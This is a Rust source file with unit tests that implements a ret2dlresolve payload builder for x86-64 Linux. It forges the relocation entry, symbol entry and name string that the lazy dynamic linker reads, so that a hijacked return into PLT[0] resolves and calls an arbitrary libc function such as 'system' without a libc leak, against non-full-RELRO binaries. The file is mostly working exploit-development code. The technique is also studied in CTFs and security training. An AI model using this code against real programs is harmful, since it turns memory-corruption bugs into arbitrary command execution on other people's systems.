//! ret2dlresolve (x86-64, "Structure" method): forge the `Elf64_Rela`, `Elf64_Sym` and name string
//! that the lazy dynamic linker reads, so returning into `PLT[0]` (`_dl_runtime_resolve`) with a
//! chosen relocation index resolves and calls an arbitrary libc symbol (e.g. `system`) — no libc
//! leak needed. Classic against non-full-RELRO dynamically-linked binaries.
//!
//! The deterministic structure/index math is unit-tested here; the end-to-end resolve depends on
//! the target's linker and must be confirmed on a live Linux run.

/// An ELF relocation/symbol structure is 24 bytes on x86-64.
const ENT: u64 = 24;
/// `R_X86_64_JUMP_SLOT`.
const R_JUMP_SLOT: u64 = 7;
/// `STB_GLOBAL | STT_FUNC` for `st_info`.
const ST_INFO: u8 = 0x12;

/// The forged payload: `bytes` to write at the chosen address, and the `reloc_index` to return into
/// `PLT[0]` with.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Payload {
    pub bytes: Vec<u8>,
    pub reloc_index: u64,
}

/// The smallest address `>= v` that is congruent to `base` modulo `align` (so `(x - base)` is a
/// whole number of `align`-byte entries).
fn align_entry(v: u64, base: u64, align: u64) -> u64 {
    let rem = v.wrapping_sub(base) % align;
    if rem == 0 { v } else { v + (align - rem) }
}

/// Builds the forged structures to place at `write_to`, resolving `symbol` and (on resolve) writing
/// the result to `got_target`. `dynsym`/`dynstr`/`rela_plt` are the binary's section addresses.
/// Returns `None` if the layout cannot be formed (addresses out of range).
pub fn build(
    dynsym: u64,
    dynstr: u64,
    rela_plt: u64,
    write_to: u64,
    got_target: u64,
    symbol: &str,
) -> Option<Payload> {
    let name = symbol.as_bytes();

    // Place the fake Rela at an rela_plt-aligned address, the fake Sym at a dynsym-aligned address
    // after it, then the name string.
    let rela_addr = align_entry(write_to, rela_plt, ENT);
    let reloc_index = (rela_addr.checked_sub(rela_plt)?) / ENT;
    let sym_addr = align_entry(rela_addr + ENT, dynsym, ENT);
    let sym_index = (sym_addr.checked_sub(dynsym)?) / ENT;
    let name_addr = sym_addr + ENT;
    let st_name = name_addr.checked_sub(dynstr)?;
    if st_name > u64::from(u32::MAX) {
        return None;
    }

    let total = (name_addr + name.len() as u64 + 1).checked_sub(write_to)? as usize;
    let mut bytes = vec![0u8; total];
    let mut put = |addr: u64, data: &[u8]| {
        let o = (addr - write_to) as usize;
        bytes[o..o + data.len()].copy_from_slice(data);
    };

    // Elf64_Rela { r_offset = got_target, r_info = (sym_index << 32) | R_JUMP_SLOT, r_addend = 0 }.
    put(rela_addr, &got_target.to_le_bytes());
    put(rela_addr + 8, &((sym_index << 32) | R_JUMP_SLOT).to_le_bytes());
    // r_addend already zero.
    // Elf64_Sym { st_name, st_info = 0x12, st_other = 0, st_shndx = 0, st_value = 0, st_size = 0 }.
    put(sym_addr, &(st_name as u32).to_le_bytes());
    put(sym_addr + 4, &[ST_INFO]);
    // Name string (NUL-terminated; the buffer is already zeroed).
    put(name_addr, name);

    Some(Payload { bytes, reloc_index })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn structures_are_well_formed() {
        // Representative section addresses from a small non-PIE binary.
        let dynsym = 0x400370;
        let dynstr = 0x400400;
        let rela_plt = 0x400460;
        let write_to = 0x601000; // .bss
        let got_target = 0x601018;
        let p = build(dynsym, dynstr, rela_plt, write_to, got_target, "system").unwrap();

        // The Rela sits at an rela_plt-aligned address; reloc_index matches.
        let rela_addr = write_to + p.reloc_index * ENT.wrapping_sub(0); // placeholder, recomputed below
        let _ = rela_addr;
        let rela_abs = rela_plt + p.reloc_index * ENT;
        assert!(rela_abs >= write_to && (rela_abs - rela_plt) % ENT == 0);

        let at = |addr: u64| -> u64 {
            let o = (addr - write_to) as usize;
            u64::from_le_bytes(p.bytes[o..o + 8].try_into().unwrap())
        };
        // r_offset
        assert_eq!(at(rela_abs), got_target);
        // r_info: low 32 bits = R_JUMP_SLOT, high = sym_index
        let r_info = at(rela_abs + 8);
        assert_eq!(r_info & 0xffff_ffff, R_JUMP_SLOT);
        let sym_index = r_info >> 32;
        let sym_addr = dynsym + sym_index * ENT;
        assert!(sym_addr > rela_abs && (sym_addr - dynsym) % ENT == 0);

        // Sym: st_info byte and st_name pointing into our string.
        let sym_o = (sym_addr - write_to) as usize;
        assert_eq!(p.bytes[sym_o + 4], ST_INFO);
        let st_name = u32::from_le_bytes(p.bytes[sym_o..sym_o + 4].try_into().unwrap()) as u64;
        let name_addr = dynstr + st_name;
        let name_o = (name_addr - write_to) as usize;
        assert_eq!(&p.bytes[name_o..name_o + 6], b"system");
        assert_eq!(p.bytes[name_o + 6], 0); // NUL-terminated
    }

    #[test]
    fn aligned_write_to_gives_index_zero_offset() {
        // write_to exactly rela_plt + N*24 -> reloc_index is that N with no extra padding.
        let rela_plt = 0x400460;
        let write_to = rela_plt + 10 * ENT;
        let p = build(0x400370, 0x400400, rela_plt, write_to, write_to, "system").unwrap();
        assert_eq!(p.reloc_index, 10);
    }
}
